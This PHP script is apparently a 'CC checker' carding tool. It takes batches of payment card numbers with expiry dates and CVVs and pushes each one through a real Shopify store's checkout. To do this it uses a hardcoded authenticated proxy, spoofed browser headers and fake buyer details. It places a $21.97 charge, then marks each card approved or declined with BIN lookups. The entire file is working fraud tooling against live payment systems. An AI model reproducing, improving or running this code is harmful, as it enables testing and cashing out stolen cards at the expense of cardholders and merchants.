<?php
session_start();
// Turn off output buffering
@ob_end_flush();
@ini_set('output_buffering', 'off');
@ini_set('zlib.output_compression', false);
// header('Content-Encoding: none');
@ini_set('implicit_flush', true);
while (ob_get_level()) ob_end_clean();
ob_implicit_flush(true);


require_once 'ua.php';
$agent = new userAgent();
$ua = $agent->generate('windows');

// Important functions start
function find_between($content, $start, $end)
{
    $startPos = strpos($content, $start);
    if ($startPos === false) {
        return '';
    }
    $startPos += strlen($start);
    $endPos = strpos($content, $end, $startPos);
    if ($endPos === false) {
        return '';
    }
    return substr($content, $startPos, $endPos - $startPos);
}

$proxy_list_str = '
51.159.85.23:6060:dljy1unah6650fl:a73sccespoqpbjo';

$proxies = explode("\n", $proxy_list_str);
$proxy_array = [];

foreach ($proxies as $proxy_line) {
    $proxy_line = trim($proxy_line);
    if (empty($proxy_line)) continue;
    $parts = explode(':', $proxy_line);
    $ip = $parts[0] ?? '';
    $port = $parts[1] ?? '';
    $username = $parts[2] ?? '';
    $password = $parts[3] ?? '';

    $proxy_array[] = [
        'ip' => $ip,
        'port' => $port,
        'username' => $username,
        'password' => $password,
    ];
}

// Function to process GET request with lista parameter
function process_get_request() {
    if (isset($_GET['lista'])) {
        $lista = $_GET['lista'];
        // Check if multiple cards are separated by commas or newlines
        if (strpos($lista, ',') !== false) {
            $cc_lines = explode(',', $lista);
        } elseif (strpos($lista, '\n') !== false) {
            $cc_lines = explode('\n', $lista);
        } else {
            $cc_lines = [$lista];
        }
        
        return array_map('trim', $cc_lines);
    }
    return [];
}

// Function to process POST request with cc_input
function process_post_request() {
    if (isset($_POST['cc_input'])) {
        $cc_input = $_POST['cc_input'];
        $cc_lines = explode("\n", $cc_input);
        return array_map('trim', $cc_lines);
    }
    return [];
}

// Check if we have GET or POST input
$cc_lines = process_get_request();
if (empty($cc_lines)) {
    $cc_lines = process_post_request();
}

// If no input, display the form
if (empty($cc_lines)) {
    echo '
    <style>
        @import url("https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap");
        body {
            font-family: "Poppins", sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            background-color: #f0f0f0;
        }
        .container {
            text-align: center;
            background-color: white;
            padding: 2rem;
            border-radius: 10px;
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
        }
        h1 {
            font-size: 2.5rem;
            color: #333;
            margin-bottom: 1.5rem;
        }
        textarea {
            width: 100%;
            padding: 0.5rem;
            margin-bottom: 1rem;
            border: 2px solid #ccc;
            border-radius: 5px;
            font-size: 1rem;
            transition: border-color 0.3s ease;
        }
        textarea:focus {
            border-color: #4CAF50;
            outline: none;
        }
        input[type="submit"] {
            background-color: #4CAF50;
            color: white;
            border: none;
            padding: 0.75rem 1.5rem;
            font-size: 1.1rem;
            cursor: pointer;
            border-radius: 5px;
            transition: background-color 0.3s ease, transform 0.1s ease;
        }
        input[type="submit"]:hover {
            background-color: #45a049;
        }
        input[type="submit"]:active {
            transform: scale(0.98);
        }
        @keyframes fadeIn {
            from { opacity: 0; }
            to { opacity: 1; }
        }
        .fade-in {
            animation: fadeIn 0.5s ease-in;
        }
        .error {
            color: red;
            margin-top: 1rem;
        }
    </style>
    <div class="container fade-in">
        <h1>Mod By Goku</h1>
        <form method="post">
            <textarea name="cc_input" rows="10" cols="50" placeholder="Enter CC details (max 10 cards, one per line)"></textarea><br>
            <input type="submit" value="Start Checking">
        </form>
    </div>';
    exit;
}

// Check if more than 10 cards are entered
if (count($cc_lines) >= 100) {
    echo '
    <style>
        @import url("https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap");
        body {
            font-family: "Poppins", sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            background-color: #f0f0f0;
        }
        .container {
            text-align: center;
            background-color: white;
            padding: 2rem;
            border-radius: 10px;
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
        }
        h1 {
            font-size: 2.5rem;
            color: #333;
            margin-bottom: 1.5rem;
        }
        textarea {
            width: 100%;
            padding: 0.5rem;
            margin-bottom: 1rem;
            border: 2px solid #ccc;
            border-radius: 5px;
            font-size: 1rem;
            transition: border-color 0.3s ease;
        }
        textarea:focus {
            border-color: #4CAF50;
            outline: none;
        }
        input[type="submit"] {
            background-color: #4CAF50;
            color: white;
            border: none;
            padding: 0.75rem 1.5rem;
            font-size: 1.1rem;
            cursor: pointer;
            border-radius: 5px;
            transition: background-color 0.3s ease, transform 0.1s ease;
        }
        input[type="submit"]:hover {
            background-color: #45a049;
        }
        input[type="submit"]:active {
            transform: scale(0.98);
        }
        @keyframes fadeIn {
            from { opacity: 0; }
            to { opacity: 1; }
        }
        .fade-in {
            animation: fadeIn 0.5s ease-in;
        }
        .error {
            color: red;
            margin-top: 1rem;
        }
    </style>
    <div class="container fade-in">
        <h1>Mod By Goku</h1>
        <p class="error">Error: You can only enter max 10 cards. Please try again.</p>
        <form method="post">
            <textarea name="cc_input" rows="10" cols="50" placeholder="Enter CC details (max 10 cards, one per line)"></textarea><br>
            <input type="submit" value="Start Checking">
        </form>
    </div>';
    exit;
}

// Loop through each cc
foreach ($cc_lines as $cc_line) {
    $cc1 = trim($cc_line);
    // Now the rest of the code uses $cc1

    if (empty($cc1)) {
        echo json_encode([
            'Error' => 'True',
            'Message' => 'Please enter card details',
            'Owner' => '⚡⚡ @mhitzxg ⚡⚡',
        ]);
        // Flush output after each card
        echo str_repeat(' ', 1024);
        flush();
        continue;
    }

    $cc_partes = explode("|", $cc1);
    $cc = $cc_partes[0];
    $month = $cc_partes[1];
    $year = $cc_partes[2];
    $cvv = $cc_partes[3];

    /*=====  sub_month  ======*/
    $yearcont = strlen($year);
    if ($yearcont <= 2) {
        $year = "20$year";
    }

    $sub_month = ltrim($month, '0');

    if ($sub_month == "") {
        $sub_month = $month;
    }

    // Proceed with other operations

    // The variables that may be uninitialized
    $err = '';
    $response = '';
    $checkouturl = '';
    $headers = [];
    $x_checkout_one_session_token = '';
    $queue_token = '';
    $stable_id = '';
    $paymentMethodIdentifier = '';
    $cctoken = '';
    $recipt_id = '';

    $urlbase = 'https://blackmp.life/';
    $domain = 'blackmp.life';
    $cookie = 'cookie.txt';
    
    $proxy = $proxy_array[array_rand($proxy_array)];

    // Enhanced debugging
    $debug_info = [];

    // Start of try-catch to handle exceptions
    try {
        echo "<pre>🔍 Starting checkout process for: $cc|$sub_month|$year|$cvv</pre>";
        flush();

        // First cURL request
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $urlbase.'/cart/42721297924198:2'); // Changed to 2 items
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
        curl_setopt($ch, CURLOPT_COOKIEJAR, $cookie);
        curl_setopt($ch, CURLOPT_MAXREDIRS, 5);
        curl_setopt($ch, CURLOPT_HEADER, true);
        curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
        curl_setopt($ch, CURLOPT_HTTPHEADER, [
            'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
            'accept-language: en-US,en;q=0.9',
            'priority: u=0, i',
            'sec-ch-ua: "Chromium";v="128", "Not;A=Brand";v="24", "Google Chrome";v="128"',
            'sec-ch-ua-mobile: ?0',
            'sec-ch-ua-platform: "Windows"',
            'sec-fetch-dest: document',
            'sec-fetch-mode: navigate',
            'sec-fetch-site: none',
            'sec-fetch-user: ?1',
            'upgrade-insecure-requests: 1',
            'user-agent: '.$ua,
        ]);
        
        curl_setopt($ch, CURLOPT_PROXY, $proxy['ip'].':'.$proxy['port']);
        curl_setopt($ch, CURLOPT_PROXYUSERPWD, $proxy['username'].':'.$proxy['password']);
        curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);

        $headers = [];
        curl_setopt($ch, CURLOPT_HEADERFUNCTION, function($ch, $headerLine) use (&$headers) {
            $parts = explode(':', $headerLine, 2);
            if (count($parts) < 2) return strlen($headerLine);
            $name = trim($parts[0]);
            $value = trim($parts[1]);

            // Save the 'Location' header
            if (strtolower($name) === 'location') {
                $headers['Location'] = $value;
            }

            return strlen($headerLine);
        });
        
        $response = curl_exec($ch);
        $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        
        $debug_info['step1_http_code'] = $http_code;
        $debug_info['step1_response_length'] = strlen($response);

        if (curl_errno($ch)) {
            $err = 'cURL error: ' . curl_error($ch);
            curl_close($ch);
            throw new Exception($err);
        }
        
        if ($http_code != 200 && $http_code != 302) {
            $err = "HTTP Error: $http_code";
            curl_close($ch);
            throw new Exception($err);
        }
        
        if (preg_match('/out of stock/i', $response)) {
            $err = 'Product is out of stock';
            curl_close($ch);
            throw new Exception($err);
        }
        curl_close($ch);

        $checkouturl = isset($headers['Location']) ? $headers['Location'] : '';
        $checkoutToken = '';
        if (preg_match('/\/cn\/([^\/?]+)/', $checkouturl, $matches)) {
            $checkoutToken = $matches[1];
        }
        
        $x_checkout_one_session_token = find_between($response, '<meta name="serialized-session-token" content="&quot;', '&quot;"');
        if (empty($x_checkout_one_session_token)) {
            // Try alternative extraction method
            $x_checkout_one_session_token = find_between($response, 'sessionToken&quot;:&quot;', '&quot;');
        }
        
        if (empty($x_checkout_one_session_token)) {
            $err = "Session token is empty - Check if site is accessible";
            $debug_info['step1_response_sample'] = substr($response, 0, 500);
            throw new Exception($err);
        }
        
        $queue_token = find_between($response, 'queueToken&quot;:&quot;', '&quot;');
        if (empty($queue_token)) {
            $err = 'Queue Token is empty';
            throw new Exception($err);
        }
        
        $stable_id = find_between($response, 'stableId&quot;:&quot;', '&quot;');
        if (empty($stable_id)) {
            $err = 'Stable id is empty';
            throw new Exception($err);
        }
        
        $paymentMethodIdentifier = find_between($response, 'paymentMethodIdentifier&quot;:&quot;', '&quot;');
        if (empty($paymentMethodIdentifier)) {
            $err = 'Payment Method Identifier Token is empty';
            throw new Exception($err);
        }

        echo "<pre>✅ Step 1 Complete - Session: " . substr($x_checkout_one_session_token, 0, 20) . "...</pre>";
        flush();

        // Second cURL request (card)
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, 'https://deposit.shopifycs.com/sessions');
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
        curl_setopt($ch, CURLOPT_HTTPHEADER, [
            'accept: application/json',
            'accept-language: en-US,en;q=0.9',
            'content-type: application/json',
            'origin: https://checkout.shopifycs.com',
            'priority: u=1, i',
            'referer: https://checkout.shopifycs.com/',
            'sec-ch-ua: "Chromium";v="128", "Not;A=Brand";v="24", "Google Chrome";v="128"',
            'sec-ch-ua-mobile: ?0',
            'sec-ch-ua-platform: "Windows"',
            'sec-fetch-dest: empty',
            'sec-fetch-mode: cors',
            'sec-fetch-site: same-site',
            'user-agent: '.$ua,
        ]);
        curl_setopt($ch, CURLOPT_POSTFIELDS, '{"credit_card":{"number":"'.$cc.'","month":'.$sub_month.',"year":'.$year.',"verification_value":"'.$cvv.'","start_month":null,"start_year":null,"issue_number":"","name":"insane xd"},"payment_session_scope":"'.$domain.'"}');
        
        curl_setopt($ch, CURLOPT_PROXY, $proxy['ip'].':'.$proxy['port']);
        curl_setopt($ch, CURLOPT_PROXYUSERPWD, $proxy['username'].':'.$proxy['password']);
        curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);
        
        $response2 = curl_exec($ch);
        $http_code2 = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        
        $debug_info['step2_http_code'] = $http_code2;
        $debug_info['step2_response'] = $response2;

        if (curl_errno($ch)) {
            $err = 'cURL error: ' . curl_error($ch);
            curl_close($ch);
            throw new Exception($err);
        }
        
        $response2js = json_decode($response2, true);
        $cctoken = $response2js['id'] ?? '';
        
        if (empty($cctoken)) {
            $error_msg = $response2js['message'] ?? 'Unknown error in card tokenization';
            $err  = 'Card Token failed: ' . $error_msg;
            curl_close($ch);
            throw new Exception($err);
        }
        curl_close($ch);

        echo "<pre>✅ Step 2 Complete - Card Token: " . substr($cctoken, 0, 20) . "...</pre>";
        flush();

        // Third cURL request (receipt) - Updated with correct amounts
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $urlbase.'/checkouts/unstable/graphql?operationName=SubmitForCompletion');
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
        curl_setopt($ch, CURLOPT_HTTPHEADER, [
            'accept: application/json',
            'accept-language: en-US',
            'content-type: application/json',
            'origin: '.$urlbase,
            'priority: u=1, i',
            'referer: '.$urlbase.'/',
            'sec-ch-ua: "Chromium";v="128", "Not;A=Brand";v="24", "Google Chrome";v="128"',
            'sec-ch-ua-mobile: ?0',
            'sec-ch-ua-platform: "Windows"',
            'sec-fetch-dest: empty',
            'sec-fetch-mode: cors',
            'sec-fetch-site: same-origin',
            'user-agent: '.$ua,
            'x-checkout-one-session-token: ' . $x_checkout_one_session_token,
            'x-checkout-web-deploy-stage: production',
            'x-checkout-web-server-handling: fast',
            'x-checkout-web-server-rendering: no',
            'x-checkout-web-source-id: ' . $checkoutToken,
        ]);

        $postf = json_encode([
            'query' => 'mutation SubmitForCompletion($input: NegotiationInput!, $attemptToken: String!) {
                submitForCompletion(input: $input, attemptToken: $attemptToken) {
                    ...on SubmitSuccess {
                        receipt {
                            ...on ProcessedReceipt {
                                id
                                token
                                redirectUrl
                            }
                            ...on ProcessingReceipt {
                                id
                                pollDelay
                            }
                            ...on FailedReceipt {
                                id
                                processingError {
                                    ...on PaymentFailed {
                                        code
                                        messageUntranslated
                                    }
                                }
                            }
                        }
                    }
                    ...on SubmitFailed {
                        reason
                    }
                    ...on SubmitRejected {
                        errors {
                            code
                            localizedMessage
                        }
                    }
                }
            }',
            'variables' => [
                'input' => [
                    'sessionInput' => [
                        'sessionToken' => $x_checkout_one_session_token
                    ],
                    'queueToken' => $queue_token,
                    'discounts' => [
                        'lines' => [],
                        'acceptUnexpectedDiscounts' => true
                    ],
                    'delivery' => [
                        'deliveryLines' => [
                            [
                                'destination' => [
                                    'streetAddress' => [
                                        'address1' => '4th Street Venue',
                                        'city' => 'New york',
                                        'countryCode' => 'US',
                                        'postalCode' => '10080',
                                        'firstName' => 'yashi Kumbi',
                                        'lastName' => 'Hasi',
                                        'zoneCode' => 'NY',
                                        'phone' => '',
                                        'oneTimeUse' => false
                                    ]
                                ],
                                'selectedDeliveryStrategy' => [
                                    'deliveryStrategyByHandle' => [
                                        'handle' => 'eedd39a6a58d3e7832641de01fda4ff4-76541393eff3a16bf34c87eae9303e6b',
                                        'customDeliveryRate' => false
                                    ]
                                ],
                                'targetMerchandiseLines' => [
                                    'lines' => [
                                        [
                                            'stableId' => $stable_id,
                                        ]
                                    ]
                                ],
                                'deliveryMethodTypes' => [
                                    'SHIPPING'
                                ],
                                'expectedTotalPrice' => [
                                    'value' => [
                                        'amount' => '5.99',
                                        'currencyCode' => 'USD'
                                    ]
                                ],
                                'destinationChanged' => false
                            ]
                        ],
                        'noDeliveryRequired' => [],
                        'useProgressiveRates' => false,
                        'prefetchShippingRatesStrategy' => null,
                        'supportsSplitShipping' => true
                    ],
                    'merchandise' => [
                        'merchandiseLines' => [
                            [
                                'stableId' => $stable_id,
                                'merchandise' => [
                                    'productVariantReference' => [
                                        'id' => 'gid://shopify/ProductVariantMerchandise/42721297924198',
                                        'variantId' => 'gid://shopify/ProductVariant/42721297924198',
                                        'properties' => [],
                                        'sellingPlanId' => null,
                                        'sellingPlanDigest' => null
                                    ]
                                ],
                                'quantity' => [
                                    'items' => [
                                        'value' => 2 // Changed from 1 to 2
                                    ]
                                ],
                                'expectedTotalPrice' => [
                                    'value' => [
                                        'amount' => '15.98', // 2 items × 7.99
                                        'currencyCode' => 'USD'
                                    ]
                                ],
                                'lineComponentsSource' => null,
                                'lineComponents' => []
                            ]
                        ]
                    ],
                    'memberships' => [
                        'memberships' => []
                    ],
                    'payment' => [
                        'totalAmount' => [
                            'any' => true
                        ],
                        'paymentLines' => [
                            [
                                'paymentMethod' => [
                                    'directPaymentMethod' => [
                                        'paymentMethodIdentifier' => $paymentMethodIdentifier,
                                        'sessionId' => $cctoken,
                                        'billingAddress' => [
                                            'streetAddress' => [
                                                'address1' => '4th Street Venue',
                                                'city' => 'New york',
                                                'countryCode' => 'US',
                                                'postalCode' => '10080',
                                                'firstName' => 'yashi Kumbi',
                                                'lastName' => 'Hasi',
                                                'zoneCode' => 'NY',
                                                'phone' => ''
                                            ]
                                        ]
                                    ]
                                ],
                                'amount' => [
                                    'value' => [
                                        'amount' => '21.97', // Changed from 13.98 to 21.97
                                        'currencyCode' => 'USD'
                                    ]
                                ]
                            ]
                        ],
                        'billingAddress' => [
                            'streetAddress' => [
                                'address1' => '4th Street Venue',
                                'city' => 'New york',
                                'countryCode' => 'US',
                                'postalCode' => '10080',
                                'firstName' => 'yashi Kumbi',
                                'lastName' => 'Hasi',
                                'zoneCode' => 'NY',
                                'phone' => ''
                            ]
                        ]
                    ],
                    'buyerIdentity' => [
                        'customer' => [
                            'presentmentCurrency' => 'USD',
                            'countryCode' => 'US'
                        ],
                        'email' => 'proxybroproxy@gmail.com',
                        'emailChanged' => false,
                        'phoneCountryCode' => 'US',
                        'marketingConsent' => [],
                        'shopPayOptInPhone' => [
                            'countryCode' => 'US'
                        ],
                        'rememberMe' => false
                    ],
                    'tip' => [
                        'tipLines' => []
                    ],
                    'taxes' => [
                        'proposedAllocations' => null,
                        'proposedTotalAmount' => [
                            'value' => [
                                'amount' => '0',
                                'currencyCode' => 'USD'
                            ]
                        ],
                        'proposedTotalIncludedAmount' => null,
                        'proposedMixedStateTotalAmount' => null,
                        'proposedExemptions' => []
                    ],
                    'note' => [
                        'message' => null,
                        'customAttributes' => []
                    ],
                    'localizationExtension' => [
                        'fields' => []
                    ],
                    'nonNegotiableTerms' => null,
                    'scriptFingerprint' => [
                        'signature' => null,
                        'signatureUuid' => null,
                        'lineItemScriptChanges' => [],
                        'paymentScriptChanges' => [],
                        'shippingScriptChanges' => []
                    ],
                    'optionalDuties' => [
                        'buyerRefusesDuties' => false
                    ],
                    'cartMetafields' => []
                ],
                'attemptToken' => $checkoutToken . '8ix3lway4kj',
                'metafields' => [],
                'analytics' => [
                    'requestUrl' => $urlbase.'/checkouts/cn/'.$checkoutToken,
                    'pageId' => 'b2b0b81e-D05D-47C0-F64C-18D9467EA842'
                ]
            ],
            'operationName' => 'SubmitForCompletion'
        ]);

        curl_setopt($ch, CURLOPT_POSTFIELDS, $postf);
        
        curl_setopt($ch, CURLOPT_PROXY, $proxy['ip'].':'.$proxy['port']);
        curl_setopt($ch, CURLOPT_PROXYUSERPWD, $proxy['username'].':'.$proxy['password']);
        curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);

        $response4 = curl_exec($ch);
        $http_code4 = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        
        $debug_info['step3_http_code'] = $http_code4;
        $debug_info['step3_response'] = $response4;

        $response4js = json_decode($response4);
        curl_close($ch);

        echo "<pre>🔍 Step 3 Response - HTTP: $http_code4</pre>";
        flush();

        // Enhanced receipt ID extraction with better error handling
        if (isset($response4js->data->submitForCompletion->receipt->id)) {
            $recipt_id = $response4js->data->submitForCompletion->receipt->id;
        } elseif (isset($response4js->data->submitForCompletion->__typename)) {
            $err = "Submit failed: " . $response4js->data->submitForCompletion->__typename;
            if (isset($response4js->data->submitForCompletion->reason)) {
                $err .= " - " . $response4js->data->submitForCompletion->reason;
            }
            throw new Exception($err);
        } elseif (isset($response4js->errors[0]->message)) {
            $err = "GraphQL Error: " . $response4js->errors[0]->message;
            throw new Exception($err);
        }

        if (empty($recipt_id)) {
            $err = 'Receipt id is empty - Check step 3 response for details';
            $debug_info['step3_parsed'] = $response4js;
            throw new Exception($err);
        }

        echo "<pre>✅ Step 3 Complete - Receipt ID: $recipt_id</pre>";
        flush();

        sleep(2);

        // Fourth request - Poll for receipt
        $postf2 = json_encode([
            'query' => 'query PollForReceipt($receiptId:ID!,$sessionToken:String!){receipt(receiptId:$receiptId,sessionInput:{sessionToken:$sessionToken}){...on ProcessedReceipt{id token redirectUrl __typename}...on ProcessingReceipt{id pollDelay __typename}...on FailedReceipt{id processingError{...on PaymentFailed{code messageUntranslated __typename}__typename}__typename}}',
            'variables' => [
                'receiptId' => $recipt_id,
                'sessionToken' => $x_checkout_one_session_token
            ],
            'operationName' => 'PollForReceipt'
        ]);

        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $urlbase.'/checkouts/unstable/graphql?operationName=PollForReceipt');
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
        curl_setopt($ch, CURLOPT_HTTPHEADER, [
            'accept: application/json',
            'accept-language: en-US',
            'content-type: application/json',
            'origin: '.$urlbase,
            'priority: u=1, i',
            'referer: '.$urlbase,
            'sec-ch-ua: "Chromium";v="128", "Not;A=Brand";v="24", "Google Chrome";v="128"',
            'sec-ch-ua-mobile: ?0',
            'sec-ch-ua-platform: "Windows"',
            'sec-fetch-dest: empty',
            'sec-fetch-mode: cors',
            'sec-fetch-site: same-origin',
            'user-agent: '.$ua,
            'x-checkout-one-session-token: ' . $x_checkout_one_session_token,
            'x-checkout-web-build-id: 63e3454a054ed16691c8d7d3dfaf57981df0b7df',
            'x-checkout-web-deploy-stage: production',
            'x-checkout-web-server-handling: fast',
            'x-checkout-web-server-rendering: no',
            'x-checkout-web-source-id: ' . $checkoutToken,
        ]);

        curl_setopt($ch, CURLOPT_POSTFIELDS, $postf2);

        $start = microtime(true); // ▶️ Start timing

        $response5 = curl_exec($ch);
        $http_code5 = curl_getinfo($ch, CURLINFO_HTTP_CODE);

        $end = microtime(true); // ▶️ End timing
        $time_taken = number_format($end - $start, 2);

        $debug_info['step4_http_code'] = $http_code5;
        $debug_info['step4_response'] = $response5;

        curl_close($ch);

        $r5js = json_decode($response5);

        echo "<pre>✅ Step 4 Complete - Final Response Received</pre>";
        flush();

        // Enhanced response parsing
        if (str_contains($response5, $checkouturl . '/thank_you')) {
            $err = '🔥Thank you for your purchase! -> $21.97';
        } elseif (str_contains($response5, $checkouturl . '/post_purchase')) {
            $err = '🔥Thank you for your purchase! -> $21.97'; 
        } elseif (str_contains($response5, 'Your order is confirmed')) {
            $err = '🔥Your Order Has Been Placed! ->> $21.97';
        } elseif (isset($r5js->data->receipt->processingError->code)) {
            $err = $r5js->data->receipt->processingError->code;
            if (isset($r5js->data->receipt->processingError->messageUntranslated)) {
                $err .= " - " . $r5js->data->receipt->processingError->messageUntranslated;
            }
        } elseif (str_contains($response5, 'CompletePaymentChallenge')) {
            $err = '⚠️ 3D Secure Challenge Required!!';
        } elseif (str_contains($response5, 'https://blackmp.life/stripe/authentications/')) {
            $err = '⚠️3DS Required !!';
        } elseif (isset($r5js->data->receipt->action->__typename) && $r5js->data->receipt->action->__typename == 'CompletePaymentChallenge') {
            $err = '⚠️3DS Secure Required !!';
        } elseif (isset($r5js->data->receipt->action->url)) {
            $err = '⚠️ 3d Secure Card !!';
        } elseif (preg_match('/CompletePaymentChallenge/', $response5)) {
            $err = '⚠️ 3D secure Required';
        } else {
            $err = 'Response is empty! Check debug info';
        }

    } catch(Exception $e) {
        if (empty($err)) {
            $err = $e->getMessage();
        }
        // Log debug info on error
        file_put_contents('debug_'.time().'.json', json_encode($debug_info, JSON_PRETTY_PRINT));
    }

    // ▶️ BIN lookup
    $bin = substr($cc, 0, 6);

    // 🧠 First try binlist.net
    $bininfo = @json_decode(file_get_contents("https://lookup.binlist.net/{$bin}"), true);

    // 🔁 Fallback to antipublic if binlist fails or rate-limited
    if (!$bininfo || !isset($bininfo['bank'])) {
        $bininfo = @json_decode(file_get_contents("https://bins.antipublic.cc/bins/{$bin}"), true);
        $bank = $bininfo['data']['bank'] ?? 'Unavailable';
        $country = $bininfo['data']['country'] ?? 'Unknown';
        $brand = $bininfo['data']['vendor'] ?? 'Unknown';
        $type = $bininfo['data']['type'] ?? 'Unknown';
    } else {
        $bank = $bininfo['bank']['name'] ?? 'Unavailable';
        $country = $bininfo['country']['name'] ?? 'Unknown';
        $brand = $bininfo['scheme'] ?? 'Unknown';
        $type = $bininfo['type'] ?? 'Unknown';
    }

    // ▶️ Status logic
    if (stripos($err, 'CHARGED') !== false || stripos($err, 'purchase') !== false || stripos($err, '⚠️ 3D Secure Challenge Required!!') !== false || stripos($err, 'INCORRECT_CVC') !== false || stripos($err, 'Order') !== false) {
        $status = "✅ 𝐀𝐏𝐏𝐑𝐎𝐕𝐄𝐃 𝐂𝐂";
    } else {
        $status = "❌ 𝐃𝐄𝐂𝐋𝐈𝐍𝐄𝐃 𝐂𝐂";
    }

    $gate = "🛒 𝐆𝐀𝐓𝐄𝐖𝐀𝐘 ↯ Stripe + Shopify $21.97 (Graphql) Charge";

    $fullmsg  = "┏━━━━━━━━━━━━━━━━━━━━━━━┓\n";
    $fullmsg .= "💥 {$gate}\n";
    $fullmsg .= "━━━━━━━━━━━━━━━━━━━━━━━━━\n";
    $fullmsg .= "{$status}\n\n";
    $fullmsg .= "💳 𝐂𝐀𝐑𝐃   ↯ {$cc}|{$sub_month}|{$year}|{$cvv}\n";
    $fullmsg .= "📩 𝐑𝐄𝐒𝐏𝐎𝐍𝐒𝐄 ↯ {$err}\n\n";
        
    $fullmsg .= "🏦 𝐁𝐀𝐍𝐊   ↯ {$bank} - {$brand} - {$type}\n";
    $fullmsg .= "🌎 𝐂𝐎𝐔𝐍𝐓𝐑𝐘 ↯ {$country}\n";
    $fullmsg .= "🕒 𝐓𝐈𝐌𝐄   ↯ " . date('Y-m-d H:i:s') . "\n";
    $fullmsg .= "⏱️ 𝐒𝐏𝐄𝐄𝐃  ↯ {$time_taken}s\n";

    $fullmsg .= "👑 𝐎𝐖𝐍𝐄𝐑 ↯ @mhitzxg | @pr0xy_xd\n";
    $fullmsg .= "┗━━━━━━━━━━━━━━━━━━━━━━━┛";

    echo "<pre>" . htmlspecialchars($fullmsg, ENT_QUOTES, 'UTF-8') . "</pre>";
    echo str_repeat(' ', 1024);
    flush();

}?>
